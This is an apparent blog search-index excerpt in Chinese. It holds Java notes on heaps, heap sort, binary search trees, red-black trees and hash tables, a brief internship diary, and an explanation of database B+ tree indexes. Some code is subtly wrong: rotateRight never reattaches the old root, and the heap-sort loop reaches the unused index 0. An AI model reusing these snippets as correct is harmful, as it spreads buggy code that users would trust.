boolean less(int i, int j) &#123; return heap[i].compareTo(heap[j]) &lt; 0; &#125; private void swap(int i, int j) &#123; Comparable t = heap[i]; heap[i] = heap[j]; heap[j] = t; &#125;&#125; 2. 上浮和下沉在堆中，当一个节点比父节点大，那么需要交换这个两个节点。交换后还可能比它新的父节点大，因此需要不断地进行比较和交换操作，把这种操作称为上浮。 123456private void swim(int k) &#123; while (k &gt; 1 &amp;&amp; less(k / 2, k)) &#123; swap(k / 2, k); k = k / 2; &#125;&#125; 类似地，当一个节点比子节点来得小，也需要不断地向下进行比较和交换操作，把这种操作称为下沉。一个节点有两个子节点，应当与两个子节点中最大那么节点进行交换。 1234567891011private void sink(int k) &#123; while (2 * k &lt;= N) &#123; int j = 2 * k; if (j &lt; N &amp;&amp; less(j, j + 1)) j++; if (!less(k, j)) break; swap(k, j); k = j; &#125;&#125; 3. 插入元素将新元素放到数组末尾，然后上浮到合适的位置。 1234public void insert(Comparable v) &#123; heap[++N] = v; swim(N);&#125; 4. 删除最大元素从数组顶端删除最大的元素，并将数组的最后一个元素放到顶端，并让这个元素下沉到合适的位置。 1234567public Comparable delMax() &#123; Comparable max = heap[1]; swap(1, N--); heap[N + 1] = null; sink(1); return max;&#125; 5. 堆排序由于堆可以很容易得到最大的元素并删除它，不断地进行这种操作可以得到一个递减序列。如果把最大元素和当前堆中数组的最后一个元素交换位置，并且不删除它，那么就可以得到一个从尾到头的递减序列，从正向来看就是一个递增序列。因此很容易使用堆来进行排序，并且堆排序是原地排序，不占用额外空间。 （一）构建堆 无序数组建立堆最直接的方法是从左到右遍历数组，然后进行上浮操作。一个更高效的方法是从右至左进行下沉操作，如果一个节点的两个节点都已经是堆有序，那么进行下沉操作可以使得这个节点为根节点的堆有序。叶子节点不需要进行下沉操作，因此可以忽略叶子节点的元素，因此只需要遍历一半的元素即可。 （二）交换堆顶元素与最后一个元素 交换之后需要进行下沉操作维持堆的有序状态。 12345678910111213141516171819202122232425public class HeapSort &#123; public static void sort(Comparable[] a) &#123; // 数组第 0 个位置不能有元素 int N = a.length - 1; for (int k = N / 2; k &gt;= 0; k--) sink(a, k, N); while (N &gt; 1) &#123; swap(a, 1, N--); sink(a, 1, N); &#125; &#125; private static void sink(Comparable[] a, int k, int N) &#123; while (2 * k &lt;= N) &#123; int j = 2 * k; if (j &lt; N &amp;&amp; less(a, j, j + 1)) j++; if (!less(a, k, j)) break; swap(a, k, j); k = j; &#125; &#125;&#125; 6. 分析一个堆的高度为 logN，因此在堆中插入元素和删除最大元素的复杂度都为 logN。 对于堆排序，由于要对 N 个节点进行下沉操作，因此复杂度为 NlogN。 堆排序时一种原地排序，没有利用额外的空间。 现代操作系统很少使用堆排序，因为它无法利用缓存，也就是数组元素很少和相邻的元素进行比较。 桶排序基数排序外部排序排序算法的比较 算法 稳定 原地排序 时间复杂度 空间复杂度 备注 选择排序 no yes N2 1 插入排序 yes yes N ~ N2 1 时间复杂度和初始顺序有关 希尔排序 no yes N 的若干倍乘于递增序列的长度 1 快速排序 no yes NlogN logN 三向切分快速排序 no yes N ~ NlogN logN 适用于有大量重复主键 归并排序 yes no NlogN N 堆排序 no yes NlogN 1 快速排序是最快的通用排序算法，它的内循环的指令很少，而且它还能利用缓存，因为它总是顺序地访问数据。它的运行时间近似为 ~cNlogN，这里的 c 比其他线性对数级别的排序算法都要小。使用三向切分快速排序，实际应用中可能出现的某些分布的输入能够达到线性级别，而其它排序算法仍然需要线性对数时间。 Java 的排序算法实现Java 主要排序方法为 java.util.Arrays.sort()，对于原始数据类型使用三向切分的快速排序，对于引用类型使用归并排序。 六、查找符号表是一种存储键值对的数据结构，主要支持两种操作：插入一个新的键值对、根据给定键得到值。 符号表分为有序和无序两种，有序符号表主要指支持 min()、max() 等根据键的大小关系来实现的操作。 有序符号表的键需要实现 Comparable 接口。 二分查找实现有序符号表使用一对平行数组，一个存储键一个存储值。 rank() 方法至关重要，当键在表中时，它能够知道该键的位置；当键不在表中时，它也能知道在何处插入新键。 复杂度：二分查找最多需要 logN+1 次比较，使用二分查找实现的符号表的查找操作所需要的时间最多是对数级别的。但是插入操作需要移动数组元素，是线性级别的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class BinarySearchST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; &#123; private Key[] keys; private Value[] values; private int N; public BinarySearchST(int capacity) &#123; keys = (Key[]) new Comparable[capacity]; values = (Value[]) new Object[capacity]; &#125; public int size() &#123; return N; &#125; public Value get(Key key) &#123; int i = rank(key); if (i &lt; N &amp;&amp; keys[i].compareTo(key) == 0) &#123; return values[i]; &#125; return null; &#125; public int rank(Key key) &#123; int lo = 0, hi = N - 1; while (lo &lt;= hi) &#123; int mid = lo + (hi - lo) / 2; int cmp = key.compareTo(keys[mid]); if (cmp == 0) return mid; else if (cmp &lt; 0) hi = mid - 1; else lo = mid + 1; &#125; return lo; &#125; public void put(Key key, Value value) &#123; int i = rank(key); if (i &lt; N &amp;&amp; keys[i].compareTo(key) == 0) &#123; values[i] = value; return; &#125; for (int j = N; j &gt; i; j--) &#123; keys[j] = keys[j - 1]; values[j] = values[j - 1]; &#125; keys[i] = key; values[i] = value; N++; &#125; public Key ceiling(Key key)&#123; int i = rank(key); return keys[i]; &#125;&#125; 二叉查找树二叉树 是一个空链接，或者是一个有左右两个链接的节点，每个链接都指向一颗子二叉树。 二叉查找树 （BST）是一颗二叉树，并且每个节点的值都大于等于其左子树中的所有节点的值而小于等于右子树的所有节点的值。 BST 有一个重要性质，就是它的中序遍历结果递增排序。 基本数据结构： 1234567891011121314151617181920212223242526public class BST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; &#123; private Node root; private class Node &#123; private Key key; private Value val; private Node left, right; // 以该节点为根的子树中节点总数 private int N; public Node(Key key, Value val, int N) &#123; this.key = key; this.val = val; this.N = N; &#125; &#125; public int size() &#123; return size(root); &#125; private int size(Node x) &#123; if (x == null) return 0; return x.N; &#125;&#125; （为了方便绘图，二叉树的空链接不画出来。） 1. get() 如果树是空的，则查找未命中； 如果被查找的键和根节点的键相等，查找命中； 否则递归地在子树中查找：如果被查找的键较小就在左子树中查找，较大就在右子树中查找。 12345678910public Value get(Key key) &#123; return get(root, key);&#125;private Value get(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x.val; else if (cmp &lt; 0) return get(x.left, key); else return get(x.right, key);&#125; 2. put()当插入的键不存在于树中，需要创建一个新节点，并且更新上层节点的链接使得该节点正确链接到树中。 123456789101112public void put(Key key, Value val) &#123; root = put(root, key, val);&#125;private Node put(Node x, Key key, Value val) &#123; if (x == null) return new Node(key, val, 1); int cmp = key.compareTo(x.key); if (cmp == 0) x.val = val; else if (cmp &lt; 0) x.left = put(x.left, key, val); else x.right = put(x.right, key, val); x.N = size(x.left) + size(x.right) + 1; return x;&#125; 3. 分析二叉查找树的算法运行时间取决于树的形状，而树的形状又取决于键被插入的先后顺序。最好的情况下树是完全平衡的，每条空链接和根节点的距离都为 logN。 在最坏的情况下，树的高度为 N。 4. floor()floor(key)：小于等于键的最大键 如果键小于根节点的键，那么 floor(key) 一定在左子树中； 如果键大于根节点的键，需要先判断右子树中是否存在 floor(key)，如果存在就找到，否则根节点就是 floor(key)。 1234567891011121314151617public Key floor(Key key) &#123; Node x = floor(root, key); if (x == null) return null; return x.key;&#125;private Node floor(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x; if (cmp &lt; 0) return floor(x.left, key); Node t = floor(x.right, key); if (t != null) &#123; return t; &#125; else &#123; return x; &#125;&#125; 5. rank()rank(key) 返回 key 的排名。 如果键和根节点的键相等，返回左子树的节点数； 如果小于，递归计算在左子树中的排名； 如果大于，递归计算在右子树中的排名，并加上左子树的节点数，再加上 1（根节点）。 12345678910public int rank(Key key) &#123; return rank(key, root);&#125;private int rank(Key key, Node x) &#123; if (x == null) return 0; int cmp = key.compareTo(x.key); if (cmp == 0) return size(x.left); else if (cmp &lt; 0) return rank(key, x.left); else return 1 + size(x.left) + rank(key, x.right);&#125; 6. min()12345private Node min(Node x) &#123; if (x == null) return null; if (x.left == null) return x; return min(x.left);&#125; 7. deleteMin()令指向最小节点的链接指向最小节点的右子树。 123456789public void deleteMin() &#123; root = deleteMin(root);&#125;public Node deleteMin(Node x) &#123; if (x.left == null) return x.right; x.left = deleteMin(x.left); x.N = size(x.left) + size(x.right) + 1; return x;&#125; 8. delete() 如果待删除的节点只有一个子树，那么只需要让指向待删除节点的链接指向唯一的子树即可； 否则，让右子树的最小节点替换该节点。 12345678910111213141516171819public void delete(Key key) &#123; root = delete(root, key);&#125;private Node delete(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp &lt; 0) x.left = delete(x.left, key); else if (cmp &gt; 0) x.right = delete(x.right, key); else &#123; if (x.right == null) return x.left; if (x.left == null) return x.right; Node t = x; x = min(t.right); x.right = deleteMin(t.right); x.left = t.left; &#125; x.N = size(x.left) + size(x.right) + 1; return x;&#125; 9. keys()利用二叉查找树中序遍历的结果为递增的特点。 12345678910111213public Iterable&lt;Key&gt; keys(Key lo, Key hi) &#123; Queue&lt;Key&gt; queue = new LinkedList&lt;&gt;(); keys(root, queue, lo, hi); return queue;&#125;private void keys(Node x, Queue&lt;Key&gt; queue, Key lo, Key hi) &#123; if (x == null) return; int cmpLo = lo.compareTo(x.key); int cmpHi = hi.compareTo(x.key); if (cmpLo &lt; 0) keys(x.left, queue, lo, hi); if (cmpLo &lt;= 0 &amp;&amp; cmpHi &gt;= 0) queue.add(x.key); if (cmpHi &gt; 0) keys(x.right, queue, lo, hi);&#125; 10. 性能分析复杂度：二叉查找树所有操作在最坏的情况下所需要的时间都和树的高度成正比。 2-3 查找树 2-3 查找树引入了 2- 节点和 3- 节点，目的是为了让树平衡。一颗完美平衡的 2-3 查找树的所有空链接到根节点的距离应该是相同的。 1. 插入操作插入操作和 BST 的插入操作有很大区别，BST 的插入操作是先进行一次未命中的查找，然后再将节点插入到对应的空链接上。但是 2-3 查找树如果也这么做的话，那么就会破坏了平衡性。它是将新节点插入到叶子节点上。 根据叶子节点的类型不同，有不同的处理方式。 插入到 2- 节点上，那么直接将新节点和原来的节点组成 3- 节点即可。 如果是插入到 3- 节点上，就会产生一个临时 4- 节点时，需要将 4- 节点分裂成 3 个 2- 节点，并将中间的 2- 节点移到上层节点中。如果上移操作继续产生临时 4- 节点则一直进行分裂上移，直到不存在临时 4- 节点。 2. 性质2-3 查找树插入操作的变换都是局部的，除了相关的节点和链接之外不必修改或者检查树的其它部分，而这些局部变换不会影响树的全局有序性和平衡性。 2-3 查找树的查找和插入操作复杂度和插入顺序无关，在最坏的情况下查找和插入操作访问的节点必然不超过 logN 个，含有 10 亿个节点的 2-3 查找树最多只需要访问 30 个节点就能进行任意的查找和插入操作。 红黑二叉查找树2-3 查找树需要用到 2- 节点和 3- 节点，红黑树使用红链接来实现 3- 节点。指向一个节点的链接颜色如果为红色，那么这个节点和上层节点表示的是一个 3- 节点，而黑色则是普通链接。 红黑树具有以下性质： 红链接都为左链接； 完美黑色平衡，即任意空链接到根节点的路径上的黑链接数量相同。 画红黑树时可以将红链接画平。 12345678910111213141516171819202122232425public class RedBlackBST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; &#123; private Node root; private static final boolean RED = true; private static final boolean BLACK = false; private class Node &#123; Key key; Value val; Node left, right; int N; boolean color; Node(Key key, Value val, int n, boolean color) &#123; this.key = key; this.val = val; N = n; this.color = color; &#125; &#125; private boolean isRed(Node x) &#123; if (x == null) return false; return x.color == RED; &#125;&#125; 1. 左旋转因为合法的红链接都为左链接，如果出现右链接为红链接，那么就需要进行左旋转操作。 12345678910public Node rotateLeft(Node h) &#123; Node x = h.right; h.right = x.left; x.left = h; x.color = h.color; h.color = RED; x.N = h.N; h.N = 1 + size(h.left) + size(h.right); return x;&#125; 2. 右旋转进行右旋转是为了转换两个连续的左红链接，这会在之后的插入过程中探讨。 123456789public Node rotateRight(Node h) &#123; Node x = h.left; h.left = x.right; x.color = h.color; h.color = RED; x.N = h.N; h.N = 1 + size(h.left) + size(h.right); return x;&#125; 3. 颜色转换一个 4- 节点在红黑树中表现为一个节点的左右子节点都是红色的。分裂 4- 节点除了需要将子节点的颜色由红变黑之外，同时需要将父节点的颜色由黑变红，从 2-3 树的角度看就是将中间节点移到上层节点。 12345void flipColors(Node h)&#123; h.color = RED; h.left.color = BLACK; h.right.color = BLACK;&#125; 4. 插入先将一个节点按二叉查找树的方法插入到正确位置，然后再进行如下颜色操作： 如果右子节点是红色的而左子节点是黑色的，进行左旋转； 如果左子节点是红色的，而且左子节点的左子节点也是红色的，进行右旋转； 如果左右子节点均为红色的，进行颜色转换。 12345678910111213141516171819public void put(Key key, Value val) &#123; root = put(root, key, val); root.color = BLACK;&#125;private Node put(Node x, Key key, Value val) &#123; if (x == null) return new Node(key, val, 1, RED); int cmp = key.compareTo(x.key); if (cmp == 0) x.val = val; else if (cmp &lt; 0) x.left = put(x.left, key, val); else x.right = put(x.right, key, val); if (isRed(x.right) &amp;&amp; !isRed(x.left)) x = rotateLeft(x); if (isRed(x.left) &amp;&amp; isRed(x.left.left)) x = rotateRight(x); if (isRed(x.left) &amp;&amp; isRed(x.right)) flipColors(x); x.N = size(x.left) + size(x.right) + 1; return x;&#125; 可以看到该插入操作和二叉查找树的插入操作类似，只是在最后加入了旋转和颜色变换操作即可。 根节点一定为黑色，因为根节点没有上层节点，也就没有上层节点的左链接指向根节点。flipColors() 有可能会使得根节点的颜色变为红色，每当根节点由红色变成黑色时树的黑链接高度加 1. 5. 分析一颗大小为 N 的红黑树的高度不会超过 2logN。最坏的情况下是它所对应的 2-3 树，构成最左边的路径节点全部都是 3- 节点而其余都是 2- 节点。 红黑树大多数的操作所需要的时间都是对数级别的。 散列表散列表类似于数组，可以把散列表的散列值看成数组的索引值。访问散列表和访问数组元素一样快速，它可以在常数时间内实现查找和插入操作。 由于无法通过散列值知道键的大小关系，因此散列表无法实现有序性操作。 1. 散列函数对于一个大小为 M 的散列表，散列函数能够把任意键转换为 [0, M-1] 内的正整数，该正整数即为 hash 值。 散列表有冲突的存在，也就是两个不同的键可能有相同的 hash 值。 散列函数应该满足以下三个条件： 一致性：相等的键应当有相等的 hash 值，两个键相等表示调用 equals() 返回的值相等。 高效性：计算应当简便，有必要的话可以把 hash 值缓存起来，在调用 hash 函数时直接返回。 均匀性：所有键的 hash 值应当均匀地分布到 [0, M-1] 之间，这个条件至关重要，直接影响到散列表的性能。 除留余数法可以将整数散列到 [0, M-1] 之间，例如一个正整数 k，计算 k%M 既可得到一个 [0, M-1] 之间的 hash 值。注意 M 必须是一个素数，否则无法利用键包含的所有信息。例如 M 为 10k，那么只能利用键的后 k 位。 对于其它数，可以将其转换成整数的形式，然后利用除留余数法。例如对于浮点数，可以将其表示成二进制形式，然后使用二进制形式的整数值进行除留余数法。 对于有多部分组合的键，每部分都需要计算 hash 值，并且最后合并时需要让每部分 hash 值都具有同等重要的地位。可以将该键看成 R 进制的整数，键中每部分都具有不同的权值。 例如，字符串的散列函数实现如下 123int hash = 0;for(int i = 0; i &lt; s.length(); i++) hash = (R * hash + s.charAt(i)) % M; 再比如，拥有多个成员的自定义类的哈希函数如下： 1int hash = (((day * R + month) % M) * R + year) % M; R 通常取 31。 Java 中的 hashCode() 实现了 hash 函数，但是默认使用对象的内存地址值。在使用 hashCode() 函数时，应当结合除留余数法来使用。因为内存地址是 32 位整数，我们只需要 31 位的非负整数，因此应当屏蔽符号位之后再使用除留余数法。 1int hash = (x.hashCode() &amp; 0x7fffffff) % M; 使用 Java 自带的 HashMap 等自带的哈希表实现时，只需要去实现 Key 类型的 hashCode() 函数即可。Java 规定 hashCode() 能够将键均匀分布于所有的 32 位整数，Java 中的 String、Integer 等对象的 hashCode() 都能实现这一点。以下展示了自定义类型如何实现 hashCode()。 12345678910111213public class Transaction&#123; private final String who; private final Date when; private final double amount; public int hashCode()&#123; int hash = 17; hash = 31 * hash + who.hashCode(); hash = 31 * hash + when.hashCode(); hash = 31 * hash + ((Double) amount).hashCode(); return hash; &#125;&#125; 2. 基于拉链法的散列表拉链法使用链表来存储 hash 值相同的键，从而解决冲突。此时查找需要分两步，首先查找 Key 所在的链表，然后在链表中顺序查找。 对于 N 个键，M 条链表 (N&gt;M)，如果哈希函数能够满足均匀性的条件，每条链表的大小趋向于 N/M，因此未命中的查找和插入操作所需要的比较次数为 ~N/M。 3. 基于线性探测法的散列表线性探测法使用空位来解决冲突，当冲突发生时，向前探测一个空位来存储冲突的键。使用线性探测法，数组的大小 M 应当大于键的个数 N（M&gt;N)。 123456789101112131415161718192021222324public class LinearProbingHashST&lt;Key, Value&gt; &#123; private int N; private int M = 16; private Key[] keys; private Value[] vals; public LinearProbingHashST() &#123; init(); &#125; public LinearProbingHashST(int M) &#123; this.M = M; init(); &#125; private void init() &#123; keys = (Key[]) new Object[M]; vals = (Value[]) new Object[M]; &#125; private int hash(Key key) &#123; return (key.hashCode() &amp; 0x7fffffff) % M; &#125;&#125; （一）查找 12345678public Value get(Key key) &#123; for (int i = hash(key); keys[i] != null; i = (i + 1) % M) &#123; if (keys[i].equals(key)) &#123; return vals[i]; &#125; &#125; return null;&#125; （二）插入 12345678910111213public void put(Key key, Value val) &#123; int i; for (i = hash(key); keys[i] != null; i = (i + 1) % M) &#123; if (keys[i].equals(key)) &#123; vals[i] = val; return; &#125; &#125; keys[i] = key; vals[i] = val; N++; resize();&#125; （三）删除 删除操作应当将右侧所有相邻的键值对重新插入散列表中。 123456789101112131415161718192021public void delete(Key key) &#123; if (!contains(key)) return; int i = hash(key); while (!key.equals(keys[i])) &#123; i = (i + 1) % M; &#125; keys[i] = null; vals[i] = null; i = (i + 1) % M; while (keys[i] != null) &#123; Key keyToRedo = keys[i]; Value valToRedo = vals[i]; keys[i] = null; vals[i] = null; N--; put(keyToRedo, valToRedo); i = (i + 1) % M; &#125; N--; resize();&#125; （四）调整数组大小 线性探测法的成本取决于连续条目的长度，连续条目也叫聚簇。当聚簇很长时，在查找和插入时也需要进行很多次探测。例如下图中 2~5 位置就是一个聚簇。 α = N/M，把 α 称为利用率。理论证明，当 α 小于 1/2 时探测的预计次数只在 1.5 到 2.5 之间。 为了保证散列表的性能，应当调整数组的大小，使得 α 在 [1/4, 1/2] 之间。 12345678910111213141516private void resize() &#123; if (N &gt;= M / 2) resize(2 * M); else if (N &lt;= M / 8) resize(M / 2);&#125;private void resize(int cap) &#123; LinearProbingHashST&lt;Key, Value&gt; t = new LinearProbingHashST&lt;&gt;(cap); for (int i = 0; i &lt; M; i++) &#123; if (keys[i] != null) &#123; t.put(keys[i], vals[i]); &#125; &#125; keys = t.keys; vals = t.vals; M = t.M;&#125; 应用1. 各种符号表实现的比较 算法 插入 查找 是否有序 二分查找实现的有序表 N logN yes 二叉查找树 logN logN yes 2-3 查找树 logN logN yes 拉链法实现的散列表 N/M N/M no 线性探测法试下的散列表 1 1 no 应当优先考虑散列表，当需要有序性操作时使用红黑树。 2. Java 的符号表实现 java.util.TreeMap：红黑树 java.util.HashMap：拉链法的散列表 3. 集合类型除了符号表，集合类型也经常使用，它只有键没有值，可以用集合类型来存储一系列的键然后判断一个键是否在集合中。 4. 稀疏向量乘法当向量为稀疏向量时，可以使用符号表来存储向量中的非 0 索引和值，使得乘法运算只需要对那些非 0 元素进行即可。 123456789101112131415161718192021222324public class SparseVector &#123; private HashMap&lt;Integer, Double&gt; hashMap; public SparseVector(double[] vector) &#123; hashMap = new HashMap&lt;&gt;(); for (int i = 0; i &lt; vector.length; i++) &#123; if (vector[i] != 0) &#123; hashMap.put(i, vector[i]); &#125; &#125; &#125; public double get(int i) &#123; return hashMap.getOrDefault(i, 0.0); &#125; public double dot(SparseVector other) &#123; double sum = 0; for (int i : hashMap.keySet()) &#123; sum += this.get(i) * other.get(i); &#125; return sum; &#125;&#125; 转自：https://github.com/CyC2018/Interview-Notebook/blob/master/notes/%E7%AE%97%E6%B3%95.md]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电信子公司的实习]]></title>
    <url>%2F2018%2F07%2F21%2F%E7%94%B5%E4%BF%A1%E5%AD%90%E5%85%AC%E5%8F%B8%E7%9A%84%E5%AE%9E%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[今天是在电信子公司—公信公司实习的第一天，整体上感觉还行。 实习公司是省电信的子公司，负责电信itv视频等技术支撑，人事等都在20楼，而研发部和运维部都在21楼，整体的公司氛围还可以，研发部还是蛮大的。 第一天，我就拿到了项目的材料，不明白的是，一个1.28G的资料，非要用QQ传递给我，我可是有优盘的啊，结果他一个上传，我一个下载，三个小时。 叫我看了看某一个后台管理的文档，让我熟悉，估计后面的维护、优化等工作要交给我做。主体技术就是SSM，后端管理页面仍然是老掉牙的JSP+easyui。 不过，个人认为，技术老旧不是重点，重点是解决问题的思路。所以，期待下面日子的成长和提高。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库索引的实现原理]]></title>
    <url>%2F2018%2F07%2F21%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B4%A2%E5%BC%95%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[mysql最后的一篇我着重来看看索引的原理。 1. 什么是索引在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据，这样就可以在这些数据结构上实现高级查找算法。这种数据结构，就是索引。 上图展示了一种可能的索引方式。左边是数据表，一共有两列七条记录，最左边的是数据记录的物理地址（注意逻辑上相邻的记录在磁盘上也并不是一定物理相邻的）。为了加快Col2的查找，可以维护一个右边所示的二叉查找树，每个节点分别包含索引键值和一个指向对应数据记录物理地址的指针，这样就可以运用二叉查找在O(log2n)的复杂度内获取到相应数据。 2. 索引的优势 第一，通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性。 第二，可以大大加快数据的检索速度，这也是创建索引的最主要的原因。 第三，可以加速表和表之间的连接，特别是在实现数据的参考完整性方面特别有意义。 第四，在使用分组和排序子句进行数据检索时，同样可以显著减少查询中分组和排序的时间。 第五，通过使用索引，可以在查询的过程中，使用优化隐藏器，提高系统的性能。 3. 索引的问题 第一，创建索引和维护索引要耗费时间，这种时间随着数据量的增加而增加。 第二，索引需要占物理空间，除了数据表占数据空间之外，每一个索引还要占一定的物理空间，如果要建立聚簇索引，那么需要的空间就会更大。 第三，当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，这样就降低了数据的维护速度。 4. 哪些情况适合用索引 在经常需要搜索的列上，可以加快搜索的速度； 在作为主键的列上，强制该列的唯一性和组织表中数据的排列结构； 在经常用在连接的列上，这些列主要是一些外键，可以加快连接的速度； 在经常需要根据范围进行搜索的列上创建索引，因为索引已经排序，其指定的范围是连续的； 在经常需要排序的列上创建索引，因为索引已经排序，这样查询可以利用索引的排序，加快排序查询时间； 在经常使用在WHERE子句中的列上面创建索引，加快条件的判断速度。 5. 不应该创建索引的的这些列具有下列特点 第一，对于那些在查询中很少使用或者参考的列不应该创建索引。这是因为，既然这些列很少使用到，因此有索引或者无索引，并不能提高查询速度。相反，由于增加了索引，反而降低了系统的维护速度和增大了空间需求。 第二，对于那些只有很少数据值的列也不应该增加索引。这是因为，由于这些列的取值很少，例如人事表的性别列，在查询的结果中，结果集的数据行占了表中数据行的很大比例，即需要在表中搜索的数据行的比例很大。增加索引，并不能明显加快检索速度。 第三，对于那些定义为text, image和bit数据类型的列不应该增加索引。这是因为，这些列的数据量要么相当大，要么取值很少。 第四，当修改性能远远大于检索性能时，不应该创建索引。这是因为，修改性能和检索性能是互相矛盾的。当增加索引时，会提高检索性能，但是会降低修改性能。当减少索引时，会提高修改性能，降低检索性能。因此，当修改性能远远大于检索性能时，不应该创建索引。 6. 索引的分类惟一索引 唯一索引是不允许其中任何两行具有相同索引值的索引。 主键索引 数据库表经常有一列或列组合，其值唯一标识表中的每一行。该列称为表的主键。 为表定义主键将自动创建主键索引，主键索引是唯一索引的特定类型。该索引要求主键中的每个值都唯一。当在查询中使用主键索引时，它还允许对数据的快速访问。 聚集索引 在聚集索引中，表中行的物理顺序与键值的逻辑（索引）顺序相同。一个表只能包含一个聚集索引。 如果某索引不是聚集索引，则表中行的物理顺序与键值的逻辑顺序不匹配。与非聚集索引相比，聚集索引通常提供更快的数据访问速度。 7. 局部性原理与磁盘预读由于存储介质的特性，磁盘本身存取就比主存慢很多，再加上机械运动耗费，磁盘的存取速度往往是主存的几百分之一，因此为了提高效率，要尽量减少磁盘I/O。为了达到这个目的，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。这样做的理论依据是计算机科学中著名的局部性原理：当一个数据被用到时，其附近的数据也通常会马上被使用。程序运行期间所需要的数据通常比较集中。 由于磁盘顺序读取的效率很高（不需要寻道时间，只需很少的旋转时间），因此对于具有局部性的程序来说，预读可以提高I/O效率。 预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。 8.B树/B+树想要理解索引原理必须清楚一种数据结构「平衡树」(非二叉)，也就是B tree或者 B+ tree，重要的事情说三遍：“平衡树，平衡树，平衡树”。当然， 有的数据库也使用哈希桶作用索引的数据结构 ， 然而， 主流的RDBMS都是把平衡树当做数据表默认的索引数据结构的。 我们平时建表的时候都会为表加上主键， 在某些关系数据库中， 如果建表时不指定主键，数据库会拒绝建表的语句执行。 事实上， 一个加了主键的表，并不能被称之为「表」。一个没加主键的表，它的数据无序的放置在磁盘存储器上，一行一行的排列的很整齐， 跟我认知中的「表」很接近。 如果给表上了主键，那么表在磁盘上的存储结构就由整齐排列的结构转变成了树状结构，也就是上面说的「平衡树」结构，换句话说，就是整个表就变成了一个索引。没错， 再说一遍， 整个表变成了一个索引，也就是所谓的「聚集索引」。 这就是为什么一个表只能有一个主键， 一个表只能有一个「聚集索引」，因为主键的作用就是把「表」的数据格式转换成「索引（平衡树）」的格式放置。 上图就是带有主键的表（聚集索引）的结构图。其中树的所有结点（底部除外）的数据都是由主键字段中的数据构成，也就是通常我们指定主键的id字段。最下面部分是真正表中的数据。 假如我们执行一个SQL语句： select * from table where id = 1256; 首先根据索引定位到1256这个值所在的叶结点，然后再通过叶结点取到id等于1256的数据行。 这里不讲解平衡树的运行细节， 但是从上图能看出，树一共有三层， 从根节点至叶节点只需要经过三次查找就能得到结果。如下图 9. 索引MyISAM引擎使用B+Tree作为索引结构，叶节点的data域存放的是数据记录的地址。因此，MyISAM中索引检索的算法为首先按照B+Tree搜索算法搜索索引，如果指定的Key存在，则取出其data域的值，然后以data域的值为地址，读取相应数据记录。 InnoDB也使用B+Tree作为索引结构。InnoDB的数据文件本身就是索引文件。MyISAM索引文件和数据文件是分离的，索引文件仅保存数据记录的地址（这一点可以通过在data目录下查看数据库文件验证。Innodb每一个数据库只有一个数据文件，而Myisam则有三个（数据文件、索引文件、表结构文件））。而在InnoDB中，表数据文件本身就是按B+Tree组织的一个索引结构，这棵树的叶节点data域保存了完整的数据记录。这个索引的key是数据表的主键，因此InnoDB表数据文件本身就是主索引。 上图是InnoDB主索引（同时也是数据文件）的示意图，可以看到叶节点包含了完整的数据记录。这种索引叫做聚集索引。因为InnoDB的数据文件本身要按主键聚集，所以InnoDB要求表必须有主键（MyISAM可以没有），如果没有显式指定，则MySQL系统会自动选择一个可以唯一标识数据记录的列作为主键，如果不存在这种列，则MySQL自动为InnoDB表生成一个隐含字段作为主键，这个字段长度为6个字节，类型为长整形 第二个与MyISAM索引的不同是InnoDB的辅助索引data域存储相应记录主键的值而不是地址。换句话说，InnoDB的所有辅助索引都引用主键作为data域。例如，图11为定义在Col3上的一个辅助索引：这里以英文字符的ASCII码作为比较准则。聚集索引这种实现方式使得按主键的搜索十分高效，但是辅助索引搜索需要检索两遍索引：首先检索辅助索引获得主键，然后用主键到主索引中检索获得记录。了解不同存储引擎的索引实现方式对于正确使用和优化索引都非常有帮助，例如知道了InnoDB的索引实现后，就很容易明白为什么不建议使用过长的字段作为主键，因为所有辅助索引都引用主索引，过长的主索引会令辅助索引变得过大。再例如，用非单调的字段作为主键在InnoDB中不是个好主意，因为InnoDB数据文件本身是一颗B+Tree，非单调的主键会造成在插入新记录时数据文件为了维持B+Tree的特性而频繁的分裂调整，十分低效，而使用自增字段作为主键则是一个很好的选择]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复杂查询训练]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%A4%8D%E6%9D%82%E6%9F%A5%E8%AF%A2%E8%AE%AD%E7%BB%83%2F</url>
